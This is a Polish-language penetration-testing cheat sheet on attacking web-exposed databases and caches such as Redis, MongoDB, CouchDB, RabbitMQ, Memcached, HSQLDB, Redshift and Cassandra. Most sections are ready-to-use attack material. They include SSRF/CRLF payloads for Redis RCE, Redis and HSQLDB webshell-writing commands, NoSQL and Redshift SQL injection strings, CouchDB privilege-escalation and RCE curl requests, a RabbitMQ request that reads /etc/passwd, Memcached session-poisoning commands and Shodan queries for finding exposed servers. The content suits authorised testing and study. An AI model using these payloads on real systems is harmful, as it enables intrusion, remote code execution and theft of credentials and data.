# Bazy danych i cache - interfejsy webowe, API i SSRF

> Podsumowanie informacji istotnych z punktu widzenia testowania aplikacji webowych
> korzystajacych z backendowych baz danych i systemow cache.

---

## 1. Redis (port 6379)

### SSRF do Redis
Redis uzywa protokolu tekstowego - jesli w aplikacji webowej istnieje podatnosc SSRF,
mozna wyslac komendy Redis przez HTTP (kazda nieznana linia zwraca blad, ale poprawne
komendy zostana wykonane).

**Przyklad: GitLab SSRF + CRLF -> RCE**
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system_hook_push%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22...
```
- Jesli kontrolujesz naglowki HTTP (np. przez CRLF injection) lub parametry POST,
  mozesz wstrzyknac komendy Redis.
- Redis domyslnie **nie wymaga uwierzytelnienia**.

### Webshell przez Redis
Jesli znasz sciezke katalogu webowego:
```
redis-cli -h <IP>
config set dir /usr/share/nginx/html
config set dbfilename shell.php
set test "<?php phpinfo(); ?>"
save
```

### Template injection przez Redis
Mozna nadpisac pliki szablonow (np. nunjucks) aby uzyskac RCE przez silnik szablonow.

---

## 2. MongoDB (port 27017/27018)

### Brak uwierzytelnienia (domyslnie)
- Domyslnie MongoDB **nie wymaga hasla**.
- Shodan: `"mongodb server information" -"partially enabled"`

### Przewidywanie Object ID (IDOR)
MongoDB Object ID sa 12-bajtowe i zawieraja:
1. Timestamp (sekundy)
2. Identyfikator maszyny
3. PID procesu
4. Licznik inkrementalny

Narzedzie: `https://github.com/andresriancho/mongo-objectid-predict`
- Wystarczy jeden Object ID (np. z rejestracji konta) aby wygenerowac ~1000 prawdopodobnych ID.
- Typowy wektor ataku **IDOR** w aplikacjach webowych uzywajacych MongoDB.

### NoSQL Injection
W kontekscie aplikacji webowych pamietaj o NoSQL injection:
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```

### MongoBleed (CVE-2025-14847) - wyciek pamieci pre-auth
- Dotyczy MongoDB 3.6-8.2 z kompresorem zlib.
- Atakujacy bez uwierzytelnienia moze wyciagnac dane z pamieci serwera (tokeny sesji, klucze API).
- PoC: `python3 mongobleed.py --host <target> --max-offset 50000 --output leaks.bin`

---

## 3. CouchDB (port 5984 HTTP / 6984 HTTPS)

### Pelne API REST po HTTP
CouchDB wystawia pelny interfejs HTTP REST:
```bash
curl http://IP:5984/                    # Banner/wersja
curl http://IP:5984/_all_dbs            # Lista baz danych
curl http://IP:5984/{db}/_all_docs      # Lista dokumentow
curl http://IP:5984/{db}/{id}           # Odczyt dokumentu
```

### Domyslne dane logowania
- Jesli brak `401 Unauthorized` - dostep jest anonimowy.
- Typowe endpointy informacyjne: `/_active_tasks`, `/_membership`, `/_scheduler/jobs`, `/_node/_local/_stats`

### Eskalacja uprawnien (CVE-2017-12635)
Tworzenie uzytkownika admin przez roznice w parserach JSON (Erlang vs JavaScript):
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' \
  localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```

### RCE przez API konfiguracji (CVE-2017-12636)
```bash
# Dodanie wlasnego query server
curl -X PUT 'http://user:pass@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' \
  -d '"/bin/bash -c \"id > /tmp/rce\""'
# Wywolanie przez widok
curl -X PUT 'http://user:pass@localhost:5984/mydb/_design/cmd' \
  -d '{"views":{"a":{"map":""}},"language":"cmd"}'
```

---

## 4. RabbitMQ Management (port 15672)

### Panel webowy z domyslnymi danymi
- URL: `http://<IP>:15672/`
- **Domyslne dane: `guest:guest`**
- Po zalogowaniu: pelna konsola administracyjna

### API HTTP
```bash
# Lista polaczen
GET http://IP:15672/api/connections

# Publikacja wiadomosci do kolejki
POST /api/exchanges/%2F/amq.default/publish
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
Content-Type: application/json

{"vhost":"/","name":"amq.default","properties":{"delivery_mode":1,"headers":{}},
 "routing_key":"email","delivery_mode":"1",
 "payload":"{\"to\":\"victim@example.com\",\"attachments\":[{\"path\":\"/etc/passwd\"}]}",
 "headers":{},"props":{},"payload_encoding":"string"}
```
- Shodan: `port:15672 http`

---

## 5. Memcached (port 11211)

### Brak uwierzytelnienia (domyslnie)
- SASL jest wspierany, ale **wiekszosc instancji jest otwarta**.
- Dane w cache moga zawierac tokeny sesji, dane uzytkownikow, odpowiedzi API.

### SSRF do Memcached
Protokol tekstowy - jesli masz SSRF, mozesz:
```bash
# Odczyt danych
echo "stats items" | nc <IP> 11211
echo "stats cachedump <slab> 0" | nc <IP> 11211
echo "get <klucz_sesji>" | nc <IP> 11211

# Zapis/nadpisanie kluczy (np. cache poisoning)
printf "set admin_session 0 3600 5\r\ntrue!\r\n" | nc <IP> 11211
```

### Cache poisoning przez SSRF
- Nadpisanie kluczy sesji w Memcached przez SSRF = przejecie sesji uzytkownika.
- Wersja 1.4.31+: `lru_crawler metadump all` - dump wszystkich kluczy.

---

## 6. HSQLDB (port 9001)

### Domyslne dane logowania
- **Uzytkownik: `sa`, haslo: puste**
- URL JDBC: `jdbc:hsqldb:hsql://<IP>/DBNAME`

### RCE przez Java Language Routines
Zapisanie webshella JSP na dysk:
```sql
CREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))
LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'

-- Zapis webshella (hex-encoded JSP)
CALL writetofile('/path/ROOT/shell.jsp', CAST('3c25...' AS VARBINARY(1024)))
```
- Czesto spotykany w aplikacjach Java EE jako embedded DB.

---

## 7. Redshift (port 5439)

### SQLi w sterownikach klienta (CVE-2024-12744/5/6)
Sterowniki JDBC 2.1.0.31, Python 2.1.4, ODBC 2.1.5.0 buduja zapytania metadanych
bez quotowania danych wejsciowych:
```python
cur.get_tables(table_schema='public',
    table_name_pattern="%' UNION SELECT usename,passwd FROM pg_user--")
```
- Jesli aplikacja webowa pozwala uzytkownikowi kontrolowac parametry katalogu/wzorca - SQLi.

### Typowe miskonf iguracje
- `PubliclyAccessible=true` + otwarty Security Group = brute-force / SQLi z Internetu.
- Brak Enhanced VPC Routing -> COPY/UNLOAD ida przez publiczny Internet (exfiltracja).

---

## 8. Cassandra (port 9042/9160)

### Brak uwierzytelnienia (domyslnie)
- Wiele instancji akceptuje **dowolne dane logowania** (brak konfiguracji auth).
- Dane logowania mogabyc w: `system_auth.roles`, `logdb.user_auth`
- Shodan: `port:9042 "Invalid or unsupported protocol version"`
